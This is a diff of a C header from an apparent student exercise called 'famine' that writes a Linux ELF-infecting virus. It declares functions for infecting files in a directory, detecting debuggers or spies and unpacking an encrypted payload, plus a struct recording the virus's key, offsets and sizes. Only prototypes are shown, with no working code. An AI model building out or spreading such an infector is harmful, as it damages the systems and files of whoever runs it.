@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:38:38 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/04 04:47:00 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 07:28:17 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,23 +15,31 @@
 
 # include <limits.h>
 # include <linux/elf.h>
+# include <stdbool.h>
+
+struct client_info
+{
+	uint32_t	key[4];
+	uint64_t	relative_pt_load_address;
+	uint64_t	pt_load_size;
+	uint64_t	relative_virus_address;
+	uint64_t	relative_entry_address;
+	uint64_t	virus_size;
+}__attribute__((packed));
 
 /*
 ** famine
 */
 
-void		famine();
-bool		elf64_identifier(void);
-void		infect_files_in(const char *path);
-bool		infect(const char *file);
+void		dear_client(const struct client_info *client);
+bool		detect_spy(void);
+void		unpacker(void);
 
 /*
-** endian management
+** virus
 */
 
-void		endian_big_mode(bool is_big_endian);
-uint16_t	endian_2(uint16_t n);
-uint32_t	endian_4(uint32_t n);
-uint64_t	endian_8(uint64_t n);
+void		virus(void);
+void		infect_files_in(const char *path);
 
 #endif
